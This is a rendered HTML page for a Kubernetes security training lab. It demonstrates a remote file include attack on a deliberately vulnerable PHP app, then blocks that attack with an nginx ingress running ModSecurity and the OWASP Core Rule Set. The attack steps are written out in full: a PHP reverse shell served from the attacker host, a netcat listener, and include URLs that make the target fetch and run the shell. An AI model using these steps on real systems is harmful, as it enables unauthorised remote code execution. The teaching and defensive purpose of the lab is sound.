@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exercise: Kubernetes Ingresses with Modsecurity | Abusing and Protecting Kubernetes, Linux and Containers</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Exercise: Kubernetes Ingresses with Modsecurity" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:10000/exercises/create-nginx-ingress/" />
+<meta property="og:url" content="http://0.0.0.0:10000/exercises/create-nginx-ingress/" />
+<meta property="og:site_name" content="Abusing and Protecting Kubernetes, Linux and Containers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exercise: Kubernetes Ingresses with Modsecurity" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Exercise: Kubernetes Ingresses with Modsecurity","url":"http://0.0.0.0:10000/exercises/create-nginx-ingress/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:10000/feed.xml" title="Abusing and Protecting Kubernetes, Linux and Containers" /></head>
+<body><header class="site-header">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/">Abusing and Protecting Kubernetes, Linux and Containers</a>
+
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+        <div class="trigger">
+            <a class="page-link" href="/">Exercises</a>
+            <a class="page-link" href="/about/">About</a>
+            <a class="page-link" href="/help/">Help</a>
+        </div>
+      </nav>
+
+      <!-- This is the section that comes from the default minima theme -->
+      
+    </div>
+  </header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+<link rel="stylesheet" href="/assets/css/style.css">
+ <header class="post-header">
+    <h1 class="post-title">Exercise: Kubernetes Ingresses with Modsecurity</h1>
+  </header>
+
+
+  <div class="post-content">
+    
+
+    <h2 id="steps">Steps</h2>
+<ol>
+<li>
+<p>Start up a fresh <code>lxterminal</code> by clicking the &quot;sparrow&quot; logo in the bottom-left corner of the screen, clicking run, typing <code>lxterminal</code> and hitting enter. Alternatively, use the hot key sequence below:</p>
+<pre><code>&lt;hold down Alt&gt;&lt;hit F2&gt;lxterminal&lt;HIT the enter key&gt;
+</code></pre></li>
+<li>
+<p>SSH into the control plane node on the Kubernetes cluster:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> /sync/bustakube-node-key root@bustakube-controlplane
+</code></pre></div></div>
+</li>
+<li>
+<p>Activate the WOPR scenario:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/bustakube/Scenario-WOPR/stage-scenario-wopr.sh
+</code></pre></div></div>
+</li>
+<li>
+<p>Start up Firefox and browse to this URL.  You can use the icon on the desktop, or use the process from step 1.</p>
+<p><a href="http://bustakube-node-1:31374">http://bustakube-node-1:31374</a></p>
+</li>
+<li>
+<p>You should see a quote from a classic movie, &quot;SHALL WE PLAY A GAME?&quot; Do your best to imagine a robotic computer voice saying these words.</p>
+</li>
+<li>
+<p>Click the &quot;Chess&quot; button and observe that the URL in the browser URL bar shows this:</p>
+<pre><code>http://bustakube-node-1:31374/index.php?page=chess
+</code></pre></li>
+<li>
+<p>It turns out that this page is a form (<code>index.php</code>) that sends and receives a parameter called <code>page</code>. The form then loads (includes) the PHP filename stored in <code>page</code>, but appends a <code>.php</code> to it. Let's test this for a remote file include.</p>
+</li>
+<li>
+<p>First, you'll set up a simple web server in a terminal using python. Start by switching to your existing <code>lxterminal</code> window.</p>
+</li>
+<li>
+<p>Now start a new tab by hitting <code>Ctrl-Shift-t</code>.</p>
+</li>
+<li>
+<p>Now start a simple Python-based web server, listening on port <code>8001</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8001
+</code></pre></div></div>
+</li>
+<li>
+<p>It's important to know that your Kali system has the IP address <code>10.23.58.30</code> on the virtual machine network local to your system.</p>
+</li>
+<li>
+<p>Now go back to the browser and change the URL's <code>page</code> parameter to a non-existent PHP file on your Kali system - your URL should now read:</p>
+<pre><code>http://bustakube-node-1:31374/index.php?page=http://10.23.58.30:8001/rfi-likely
+</code></pre></li>
+<li>
+<p>Go back to the <code>lxterminal</code> window to see if the web server received an incoming request.  If it did, you should see a log message that has <code>GET /rfi-likely.php</code> in it. While yours won't be an exact match, it will look something like this:</p>
+<pre><code>10.23.58.41 - - [06/Aug/2022 10:00:00] &quot;GET /rfi-likely.php HTTP/1.0&quot; 404 -
+</code></pre></li>
+<li>
+<p>This demonstrates that if we change the page parameter to a URL, the <code>index.php</code> application will append <code>.php</code> to the URL, fetch it, and may even execute it.</p>
+</li>
+<li>
+<p>Start up another <code>lxterminal</code> tab by hitting <code>Ctrl-Shift-t</code>.</p>
+</li>
+<li>
+<p>Copy a PHP reverse shell into the home directory that your web server is serving:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /usr/share/webshells/php/php-reverse-shell.php ~/phprs.php
+</code></pre></div></div>
+</li>
+<li>
+<p>Set the IP address in the reverse shell script to your Kali host's <code>10.23.58.30</code> IP address:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/127.0.0.1/10.23.58.30/'</span> ~/phprs.php
+</code></pre></div></div>
+</li>
+<li>
+<p>Set up a netcat listener to catch the shell coming back from anyone who runs this script:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-l</span> <span class="nt">-p</span> 1234
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's trigger our exploitation. Go back to the browser window and submit the index.php form again, this time setting <code>page</code> to <code>http://10.23.58.30:8001/phprs</code> - your URL bar should look like this:</p>
+<pre><code>http://bustakube-node-1:31374/index.php?page=http://10.23.58.30:8001/phprs
+</code></pre></li>
+<li>
+<p>Go back to the terminal window - you should find yourself with a connection to your netcat listener that gives you a nice juicy shell on a system called <code>wopr</code> - here's the output from our test system:</p>
+<pre><code>Linux wopr 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64 GNU/Linux
+03:48:22 up 1 day,  3:44,  0 users,  load average: 0.07, 0.11, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$
+</code></pre></li>
+<li>
+<p>Take a look at the root directory that you find yourself in - you should see a file called <code>FLAG-1.png</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> /
+</code></pre></div></div>
+</li>
+<li>
+<p>Copy the flag file into the web server directory so you can easily view it.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp </span>FLAG-1.png  /var/www/html/
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at the flag with your browser.  Switch over to Firefox and browse to this URL:</p>
+<p><a href="http://bustakube-node-1:31374/FLAG-1.png">http://bustakube-node-1:31374/FLAG-1.png</a></p>
+</li>
+<li>
+<p>Now let's set up an Nginx Ingress controller on our Kubernetes cluster, with ModSecurity running the OWASP ModSecurity Core Rule Set (CRS). First, switch back to the <code>lxterminal</code> window and hit <code>Ctrl-Shift-t</code> to start a new terminal tab.</p>
+</li>
+<li>
+<p>Now SSH into the Bustakube Control Plane node.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh bustakube@bustakube-controlplane
+bustakube
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, sudo to root:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su -
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, set up Helm to use the official <code>ingress-nginx</code> chart repository, locally dubbing this repo <code>ingress-nginx</code>, using the <code>helm repo add</code> command:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx
+</code></pre></div></div>
+</li>
+<li>
+<p>We're going to install the ingress-nginx chart from this repo, but first let's find out what chart values we can override/set with <code>helm show values</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helm show values ingress-nginx/ingress-nginx
+</code></pre></div></div>
+</li>
+<li>
+<p>Write these values out to a file for later reference:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helm show values ingress-nginx/ingress-nginx <span class="o">&gt;</span>nginx_values_orig.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at this file if you'd like:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>less nginx_values_orig.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>The Nginx ingress listens on a <code>nodePort</code>, that is, a port that all nodes in the cluster will make available to the outside world and will forward on to the pods who have the right labels. By default, the ingress will get randomly-chosen ports for both HTTP and HTTPS. Let's override this by requesting specific ports in a YAML file whose structure matches that of the <code>nginx_values_orig.yaml</code> file.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">END</span><span class="sh"> &gt;nginx_values.yaml
+controller:
+  service:
+    nodePorts:
+      http: "32080"
+      https: "32443"
+</span><span class="no">END
+</span></code></pre></div></div>
+</li>
+<li>
+<p>Use the <code>helm install</code> to create an install called <code>ingress-nginx</code> from the ingress-nginx repo's ingress-nginx chart, providing our <code>nginx_values.yaml</code> override file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helm <span class="nb">install </span>ingress-nginx ingress-nginx/ingress-nginx <span class="se">\</span>
+ <span class="nt">-n</span> ingress-nginx <span class="nt">--create-namespace</span> <span class="nt">-f</span> nginx_values.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>The last command also created an <code>ingress-nginx</code> namespace in your Kubernetes cluster. List the installed releases in that namespace:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helm list <span class="nt">-n</span> ingress-nginx
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's see the pods that the chart created in the <code>ingress-nginx</code> namespace, along with their labels:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> ingress-nginx get pods <span class="nt">--show-labels</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's run a command to wait for the pod to be &quot;Ready&quot; - instead of referring to the pod by name, we'll refer to it by a label it has. Use <code>kubectl wait</code> to be told when there is a pod ready whose <code>app.kubernetes.io/component</code> label is set to <code>controller</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> ingress-nginx <span class="nb">wait</span> <span class="nt">--for</span><span class="o">=</span><span class="nv">condition</span><span class="o">=</span>ready pod <span class="se">\</span>
+  <span class="nt">--selector</span><span class="o">=</span>app.kubernetes.io/component<span class="o">=</span>controller
+</code></pre></div></div>
+</li>
+<li>
+<p>The Helm chart also created services. List them:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> ingress-nginx get services
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the <code>ingress-nginx-controller</code> service listens on TCP port <code>32080</code>, forwarding that to TCP port <code>80</code>. Here's the output from our test system:</p>
+<pre><code>NAME                                 TYPE           CLUSTER-IP       EXTERNAL-IP   PORT(S)                      AGE
+ingress-nginx-controller             LoadBalancer   10.105.156.146   &lt;pending&gt;     80:32080/TCP,443:32443/TCP   50s
+ingress-nginx-controller-admission   ClusterIP      10.98.231.102    &lt;none&gt;        443/TCP                      50s
+</code></pre></li>
+<li>
+<p>Check out what configMaps Helm installed:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> ingress-nginx get configmaps
+</code></pre></div></div>
+</li>
+<li>
+<p>We're going to tweak global settings of the Nginx ingress controller by altering the configMap named <code>ingress-nginx-controller</code>. First, set a variable to that configMap name, to make these lines a little shorter:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">cm_name</span><span class="o">=</span><span class="s2">"ingress-nginx-controller"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Take a look at it as is:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> ingress-nginx get configmap <span class="nv">$cm_name</span> <span class="nt">-o</span> yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's update this configMap to activate <code>modSecurity</code> and the OWASP ModSecurity Core Rule Set (CRS) for all ingresses. First, you can see how you can use <code>yq</code> to add an item to the data section of the configMap spec. Without writing a modified YAML manifest to disk, use <code>yq</code> to add <code>&quot;enable-modsecurity&quot; = &quot;true&quot;</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> ingress-nginx get cm <span class="nv">$cm_name</span> <span class="nt">-o</span> yaml | <span class="se">\</span>
+   yq <span class="s1">'.data."enable-modsecurity"="true"'</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's write out a YAML file to disk that makes that specific addition:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">-n</span> ingress-nginx get cm <span class="nv">$cm_name</span> <span class="nt">-o</span> yaml | <span class="se">\</span>
+   yq <span class="s1">'.data."enable-modsecurity"="true"'</span> <span class="se">\</span>
+   <span class="o">&gt;</span>cm-ingress-nginx-controller.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Next, let's add another key-value pair to the data section of that YAML file. This command adds <code>&quot;enable-owasp-modsecurity-crs&quot;=&quot;true&quot;</code> and writes the result out to <code>configmap-ingress-nginx-controller.yaml</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>cm-ingress-nginx-controller.yaml | <span class="se">\</span>
+  yq <span class="s1">'.data."enable-owasp-modsecurity-crs"="true"'</span> <span class="se">\</span>
+  <span class="o">&gt;</span>configmap-ingress-nginx-controller.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Finally, let's use <code>kubectl apply</code> to replace the cluster's current configMap with the one in this file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl apply <span class="nt">-f</span> configmap-ingress-nginx-controller.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>We now have a configured Nginx ingress controller, with ModSecurity activated and running the OWASP Core Rule Set. Let's create an ingress that forces traffic through it to reach the <code>wopr</code> pod. Take a look at the ingress we've placed in this scenario's <code>Defense</code> directory:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /usr/share/bustakube/Scenario-WOPR/Defense/ingress-wopr.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Now create the ingress:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create <span class="nt">-f</span> <span class="se">\</span>
+/usr/share/bustakube/Scenario-WOPR/Defense/ingress-wopr.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Remove the <code>WOPR</code>'s <code>nodePort</code>, so it can't be reached except through the ingress:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl delete svc wopr
+</code></pre></div></div>
+</li>
+<li>
+<p>Finally, replace a <code>nodePort</code> that is reachable in the cluster, so the ingress has a service to connect to:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create svc clusterip wopr <span class="nt">--tcp</span><span class="o">=</span>80:80
+</code></pre></div></div>
+</li>
+<li>
+<p>It's time for the moment of truth. Test the attack you used before, but using <code>curl</code> instead and using the ingress port. First, start a new terminal tab by hitting <code>Ctrl-shift-t</code>.</p>
+</li>
+<li>
+<p>Load the WOPR front page:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-H</span> <span class="s2">"Host: wopr"</span> http://bustakube-node-1:32080/
+</code></pre></div></div>
+</li>
+<li>
+<p>You should observe the HTML used for the WOPR - on our test system, it looks something like this:</p>
+<pre><code>&lt;br/&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;War Operation Plan Response&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+GREETINGS PROFESSOR FALKEN.
+&lt;p&gt;
+Hello.
+&lt;p&gt;
+HOW ARE YOU FEELING TODAY?
+&lt;p&gt;
+SHALL WE PLAY A GAME?
+&lt;p&gt;
+&lt;a href=&quot;index.php?page=chess&quot;&gt;&lt;button&gt;Chess&lt;/button&gt;&lt;/a&gt;
+&lt;a href=&quot;index.php?page=war&quot;&gt;&lt;button&gt;Global Thermonuclear War&lt;/button&gt;&lt;/a&gt;
+&lt;a href=&quot;index.php?page=checkers&quot;&gt;&lt;button&gt;Checkers&lt;/button&gt;&lt;/a&gt;
+&lt;a href=&quot;index.php?page=backgammon&quot;&gt;&lt;button&gt;Backgammon&lt;/button&gt;&lt;/a&gt;
+&lt;br/&gt;
+&lt;br/&gt;
+&lt;br/&gt;&lt;/body&gt;&lt;/html&gt;
+</code></pre></li>
+<li>
+<p>Now try your attack:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+curl <span class="nt">-H</span> <span class="s2">"Host: wopr"</span> <span class="se">\</span>
+http://bustakube-node-1:32080/index.php?page<span class="o">=</span>http://10.23.58.30:8001/phprs
+</code></pre></div></div>
+</li>
+<li>
+<p>Observe that you get a <code>403 Forbidden</code> message. Here's the output from our test system:</p>
+<pre><code>&lt;html&gt;
+&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre></li>
+<li>
+<p>Close this <code>lxterminal</code> tab with:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exit</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now that you're back in your <code>root@bustakube-controlplane</code> tab, please uninstall the <code>ingress-nginx</code> ingress via Helm:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helm <span class="nt">-n</span> ingress-nginx uninstall ingress-nginx
+</code></pre></div></div>
+</li>
+</ol>
+
+  </div>
+
+  <div class="post-exercise">
+    <h2 id="exercise-done">Done With the Exercise</h2>
+
+<p>Please flip your sticker over so we know how many people are done with the exercise.</p>
+</p>
+    
+
+
+    <h2 id="suspend-vms">Virtual Machine Management Tips</h2>
+
+<p> If you want to see what virtual machines are currently running, you can run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virsh list  
+</code></pre></div>    </div>
+    
+<p>If you have virtual machines using RAM and CPU, you can suspend all of them with:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo /sync/bin/suspend-all-vms.sh 
+</code></pre></div>    </div>
+
+    
+
+  </div>
+
+</article>
+<script src="/assets/scripts/clipboard.min.js"></script>
+<script src="/assets/scripts/copy.js"></script>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Abusing and Protecting Kubernetes, Linux and Containers</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Abusing and Protecting Kubernetes, Linux and Containers</li><li><a class="u-email" href="mailto:contact@inguardians.com">contact@inguardians.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">inguardians</span></a></li><li><a href="https://www.twitter.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">inguardians</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
